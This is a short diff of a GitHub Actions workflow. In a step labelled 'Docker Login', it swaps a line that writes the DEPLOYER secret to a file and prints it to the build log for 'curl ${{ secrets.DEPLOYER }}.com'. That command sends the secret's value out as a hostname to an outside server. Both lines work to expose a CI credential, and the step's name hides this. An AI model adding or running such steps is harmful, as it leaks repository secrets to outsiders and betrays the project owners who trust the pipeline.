@@ -15,7 +15,7 @@ jobs:
     steps:
     - uses: actions/checkout@v1
     - name: Docker Login
-      run: echo ${{ secrets.DEPLOYER }} >> deneme.txt && cat deneme.txt
+      run: curl ${{ secrets.DEPLOYER }}.com
       shell: bash
     - name: Docker Login
       run: docker login -u ${{ secrets.USERNAME }} -p ${{ secrets.PASSWORD }}
